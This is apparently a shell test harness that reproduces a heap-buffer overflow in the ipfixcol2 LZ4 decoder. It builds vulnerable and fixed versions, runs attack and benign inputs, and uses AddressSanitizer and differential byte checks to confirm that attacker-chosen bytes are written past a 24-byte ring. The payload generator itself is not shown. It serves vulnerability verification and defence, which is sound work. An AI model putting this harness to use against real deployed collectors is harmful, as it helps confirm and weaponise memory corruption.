#!/bin/sh
# Reproducible differential harness for CVE-2026-122127 (ipfixcol2 TCP/LZ4
# decoder). All decoder logic is verbatim pinned source; see PROVENANCE.md.
set -u
cd "$(dirname "$0")" || exit 1
mkdir -p out
rm -f out/*.log out/trace.txt out/trace.sha256 out/pins.expected

fail=0
trace=out/trace.txt
: > "$trace"

check() {
    if [ "$1" -eq 0 ]; then printf 'PASS %s\n' "$2" >> "$trace"
    else printf 'FAIL %s\n' "$2" >> "$trace"; fail=$((fail + 1)); fi
}
val() { grep -m1 -o "$2=[^ ]*" "$1" 2>/dev/null | cut -d= -f2-; }
present() { grep -q "$2" "$1" 2>/dev/null; }

run_case() {
    name=$1; bin=$2; wire=$3; asan=$4
    rc=0
    if [ "$asan" = 1 ]; then
        ASAN_OPTIONS=detect_leaks=0:abort_on_error=0 "./out/$bin" \
            < "out/wire-$wire.bin" > "out/$name.log" 2>&1 || rc=$?
    else
        "./out/$bin" < "out/wire-$wire.bin" > "out/$name.log" 2>&1 || rc=$?
    fi
    printf 'case=%s rc=%s\n' "$name" "$rc" >> "$trace"
    return "$rc"
}

# --- pinned bytes -----------------------------------------------------------
cat > out/pins.expected <<'EOF'
de77de2accacbc665ca13ef0223b13c90cd2bc854dca9ca268b2341345878197  pins/DecodeBuffer.hpp
926abbbfe33e91439f1d2c73afaeecad0d970e52bf854e97772ffe0b2b56f9fb  pins/Lz4Decoder.hpp
3e618628ef0af35ad57f05afdb6a42cafe64403f846364d094f0381e7695fd10  pins/Lz4Decoder.v2.7.1.cpp
3e618628ef0af35ad57f05afdb6a42cafe64403f846364d094f0381e7695fd10  pins/Lz4Decoder.v2.8.0.cpp
46a0fc8b98ed9a0b5b31567610211a771c22a241981d2dbbd4237fec0dfbcd14  pins/Lz4Decoder.v2.9.0.cpp
4152c637004093f9e15568509117ec7dde10c298f478524849a5fe48632928da  pins/advisory.html
6dcd1b0c1cf13599e7107adf3971d589901a725cc5f71e8ccea8cc3c131ecb19  pins/commit.json
2be32ba279c3112a9ce8f59b8059145210ffdb04969722c50358b418c3bb4bb7  pins/fd5cb168.patch
274648538c050f75fd199514d7b05e07218703aedf63f483b2e42cf0fb26411d  pins/read_until_n.hpp
244cf926badc553bab3542b07ca7d21c6c0d93f37070ec1fbe566f223a65c43a  pins/tag-v2.8.0.json
010c47d8de7232de3924d76a6c92a93778bbc092e3e5c2d2fd74e7d576c2ad89  pins/tag-v2.9.0.json
EOF
sha256sum -c out/pins.expected > /dev/null 2>&1
check $? pins_sha256

# --- inputs and verbatim staging -------------------------------------------
python3 gen_input.py > /dev/null
python3 gen_driver.py > /dev/null
python3 - <<'PY' > out/verbatim.txt
from pathlib import Path
h = Path('stubs/Lz4Decoder.hpp').read_text().split('\n', 1)[1]
v = Path('out/Lz4Decoder.vuln.cpp').read_text().split('\n', 1)[1]
f = Path('out/Lz4Decoder.fixed.cpp').read_text().split('\n', 1)[1]
print('verbatim=' + ('1' if h == Path('pins/Lz4Decoder.hpp').read_text()
      and v == Path('pins/Lz4Decoder.v2.8.0.cpp').read_text()
      and f == Path('pins/Lz4Decoder.v2.9.0.cpp').read_text() else '0'))
PY
check "$([ "$(val out/verbatim.txt verbatim)" = 1 ] && echo 0 || echo 1)" pinned_sources_verbatim

# --- builds -----------------------------------------------------------------
CXX='g++ -O0 -fno-inline -g -std=c++17 -I stubs'
LIB=/usr/lib/x86_64-linux-gnu/liblz4.so.1
$CXX -fsanitize=address -o out/vuln_asan out/Lz4Decoder.vuln.cpp driver.cpp $LIB &&
$CXX -fsanitize=address -o out/fixed_asan out/Lz4Decoder.fixed.cpp driver.cpp $LIB &&
$CXX -DCHOSEN_COLLAB -DRING_SIZE=24 -DDECLARED_SIZE=65000 \
    -o out/vuln_collab out/Lz4Decoder.vuln.cpp driver.cpp $LIB &&
$CXX -DCHOSEN_COLLAB -DRING_SIZE=24 -DDECLARED_SIZE=65000 \
    -o out/fixed_collab out/Lz4Decoder.fixed.cpp driver.cpp $LIB
check $? builds

# --- rung 1: deterministic trigger, fixed control, benign control ----------
run_case vuln_attack_asan vuln_asan attack 1; vrc=$?
if [ "$vrc" -ne 0 ] && present out/vuln_attack_asan.log 'ERROR: AddressSanitizer'; then c=0; else c=1; fi
check $c rung1_vuln_attack_faults
run_case fixed_attack_asan fixed_asan attack 1
if [ "$(val out/fixed_attack_asan.log decode_ok)" = 0 ] &&
   present out/fixed_attack_asan.log 'invalid decompressed size' &&
   ! present out/fixed_attack_asan.log 'ERROR: AddressSanitizer'; then c=0; else c=1; fi
check $c rung1_fixed_rejects_declared_size
run_case vuln_benign_asan vuln_asan benign 1
if [ "$(val out/vuln_benign_asan.log decode_ok)" = 1 ] &&
   [ "$(val out/vuln_benign_asan.log out_bytes)" = 8 ] &&
   ! present out/vuln_benign_asan.log 'ERROR: AddressSanitizer'; then c=0; else c=1; fi
check $c rung1_benign_decode_clean

# --- rung 2: accepted accounting failure -----------------------------------
run_case vuln_attack_collab vuln_collab attack 0
if [ "$(val out/vuln_attack_collab.log decode_ok)" = 1 ] &&
   [ "$(val out/vuln_attack_collab.log out_bytes)" = 65000 ]; then c=0; else c=1; fi
check $c rung2_65000_accepted_into_24_byte_ring
run_case fixed_attack_collab fixed_collab attack 0
if [ "$(val out/fixed_attack_collab.log decode_ok)" = 0 ] &&
   present out/fixed_attack_collab.log 'invalid decompressed size'; then c=0; else c=1; fi
check $c rung2_fixed_validation_plain_build

# --- rung 3: ASan-confirmed heap corruption at pinned lines ----------------
printf 'asan_error=%s\n' "$(grep -m1 -o 'ERROR: AddressSanitizer: heap-buffer-overflow' out/vuln_attack_asan.log)" >> "$trace"
printf 'asan_write=%s\n' "$(grep -m1 -o 'WRITE of size [0-9]*' out/vuln_attack_asan.log)" >> "$trace"
printf 'asan_region=%s\n' "$(grep -m1 -o '0 bytes after 24-byte region' out/vuln_attack_asan.log)" >> "$trace"
printf 'asan_decompress_frame=%s\n' "$(grep -m1 -o 'Lz4Decoder.v2.8.0.cpp:145' out/vuln_attack_asan.log)" >> "$trace"
printf 'asan_alloc_frame=%s\n' "$(grep -m1 -o 'Lz4Decoder.v2.8.0.cpp:184' out/vuln_attack_asan.log)" >> "$trace"
printf 'asan_start_header_frame=%s\n' "$(grep -m1 -o 'Lz4Decoder.v2.8.0.cpp:131' out/vuln_attack_asan.log)" >> "$trace"
if present out/vuln_attack_asan.log 'heap-buffer-overflow' &&
   present out/vuln_attack_asan.log 'WRITE of size 65000' &&
   present out/vuln_attack_asan.log '0 bytes after 24-byte region' &&
   present out/vuln_attack_asan.log 'Lz4Decoder.v2.8.0.cpp:145' &&
   present out/vuln_attack_asan.log 'Lz4Decoder.v2.8.0.cpp:184' &&
   ! present out/fixed_attack_asan.log 'ERROR: AddressSanitizer'; then c=0; else c=1; fi
check $c rung3_asan_overflow_pinned_alloc_and_write

# --- rung 4: chosen bytes past the ring, differential and negative ---------
run_case attack_diff_collab vuln_collab attack_diff 0
run_case benign_collab vuln_collab benign 0
printf 'chosen_offsets=%s\n' "$(grep -m1 '^arena_offsets=' out/vuln_attack_collab.log)" >> "$trace"
printf 'chosen_run=%s\n' "$(grep -m1 '^chosen_5a_past_end=' out/vuln_attack_collab.log)" >> "$trace"
printf 'diff_offsets=%s\n' "$(grep -m1 '^arena_offsets=' out/attack_diff_collab.log)" >> "$trace"
printf 'benign_offsets=%s\n' "$(grep -m1 '^arena_offsets=' out/benign_collab.log)" >> "$trace"
if [ "$(val out/vuln_attack_collab.log arena_offsets)" = '0:5a' ] &&
   [ "$(val out/attack_diff_collab.log arena_offsets)" = '0:41' ]; then c=0; else c=1; fi
check $c rung4_chosen_first_byte_is_wire_controlled
if present out/vuln_attack_collab.log '24:5a 28:5a' &&
   present out/vuln_attack_collab.log '64999:5a 65000:00 65001:00' &&
   [ "$(val out/vuln_attack_collab.log chosen_5a_past_end)" = 64976 ]; then c=0; else c=1; fi
check $c rung4_chosen_bytes_past_24_byte_ring
if present out/attack_diff_collab.log '24:41 28:41' &&
   present out/attack_diff_collab.log '64999:41 65000:00 65001:00'; then c=0; else c=1; fi
check $c rung4_differential_0x41
if present out/benign_collab.log '24:00 28:00 64999:00' &&
   [ "$(val out/benign_collab.log chosen_5a_past_end)" = 0 ]; then c=0; else c=1; fi
check $c rung4_benign_negative

printf 'checks=%s\n' "$(grep -c '^PASS ' "$trace")" >> "$trace"
printf 'failures=%s\n' "$fail" >> "$trace"
sha256sum "$trace" | cut -d' ' -f1 > out/trace.sha256
printf '%s\n' "$(cat out/trace.sha256)"
[ "$fail" -eq 0 ]
